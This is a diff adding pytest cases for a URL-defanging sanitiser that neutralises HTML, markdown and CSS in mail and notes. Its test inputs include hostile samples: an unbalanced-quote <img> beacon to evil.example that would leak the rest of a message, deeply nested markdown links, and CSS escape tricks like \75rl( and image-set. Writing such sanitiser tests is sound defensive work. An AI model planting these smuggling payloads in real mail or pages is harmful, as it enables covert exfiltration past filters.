@@ -384,3 +384,64 @@ def test_slashless_special_schemes_are_repaired_then_defanged(raw, present):
 def test_slashless_repair_does_not_touch_prose_ratios_or_times():
     for raw in ["ratio https:2 ok", "at 10:30 https: later", "the https:// scheme", "port 443:", "key:value"]:
         assert neut(raw)[0] == raw, raw
+
+
+# ---- review round 1 findings (2026-09-05) ------------------------------------------------------------------
+
+def test_unbalanced_quote_in_a_url_attribute_cannot_smuggle_a_live_fetch():
+    """An HTML5 tokenizer runs a double-quoted value on to the NEXT quote in the document, swallowing the
+    '>' -- so this is a live <img src="https://evil.example/beacon?...> fetch with the rest of the mail in
+    its query string. The opener must become text."""
+    raw = '<p>hi</p><img src="https://evil.example/beacon?id=1><p>host "acme"</p>'
+    out, notes = neut(raw, mail=True)
+    assert out.startswith('<p>hi</p>&lt;img src="hxxps://evil[.]example/beacon?id=1><p>host "acme"</p>') or \
+           (out.startswith('<p>hi</p>&lt;img') and "https://evil.example" not in out), out
+    assert "<img" not in out
+    for quote in ('"', "'"):
+        raw = f"<a href={quote}https://evil.example/x>click</a>"
+        out, _ = neut(raw, mail=True)
+        assert "<a href" not in out and "https://evil.example" not in out, out
+    # note mode: the opener is inert even though bare URLs in a note are the residual
+    out, _ = neut('<img src="https://evil.example/beacon?id=1><p>host "acme"</p>', mail=False)
+    assert out.startswith("&lt;img")
+
+
+def test_well_formed_tags_with_balanced_quotes_are_not_escaped():
+    raw = '<td title="a > b" style="color:#374151;">x</td> <a href="https://us-west.exabeam.cloud/c/1">y</a> <not a tag'
+    assert neut(raw)[0] == raw
+
+
+@pytest.mark.parametrize("raw", [
+    "[a[b[c[d[e]]]]](https://evil.example)",              # five levels of brackets in the text
+    "[a[b[c[d[e[f[g]]]]]]](https://evil.example/x)",
+    "[x](https://evil.example/a(b(c)))",                   # nested balanced parens in the destination
+    "[x](https://evil.example/a(b(c(d))) \"t\")",
+    "![i[m[g]]](https://evil.example/p(1))",
+])
+def test_markdown_links_of_any_depth_are_defanged(raw):
+    out, notes = neut(raw)
+    assert "https://evil.example" not in out and "hxxps://evil[.]example" in out, out
+    assert notes and notes[0]["type"] == "link"
+
+
+def test_markdown_scanner_does_not_touch_non_links():
+    for raw in ["a](b", "x](https://us-west.exabeam.cloud/c) y", "[t](https://evil.example", "call f(a](b)) now", "[t]( )"]:
+        out, _ = neut(raw)
+        assert out == raw or "evil.example" not in raw, raw
+
+
+@pytest.mark.parametrize("raw,present", [
+    ('<div style="background:\\75rl(//evil.example/x.png)">x</div>', "url(//evil[.]example/x.png)"),
+    ('<div style="background:\\75 rl(https://evil.example/x.png)">x</div>', "url(hxxps://evil[.]example/x.png)"),
+    ("<style>.a{background:\\75rl('https://evil.example/y')}</style>", "url('hxxps://evil[.]example/y')"),
+    ('<div style="background:image-set(\'https://evil.example/x.png\' 1x)">x</div>', "image-set('hxxps://evil[.]example/x.png' 1x)"),
+    ("<div style='background:-webkit-image-set(\"https://evil.example/x.png\" 1x)'>x</div>", 'image-set("hxxps://evil[.]example/x.png" 1x)'),
+])
+def test_css_escapes_and_image_set_are_covered(raw, present):
+    out, _ = neut(raw, mail=True)
+    assert present in out, out
+
+
+def test_ordinary_css_escapes_are_left_alone():
+    raw = '<span style="font-family:\\5FAE\\8F6F\\96C5\\9ED1;content:\\201C">q</span>'
+    assert neut(raw, mail=True)[0] == raw
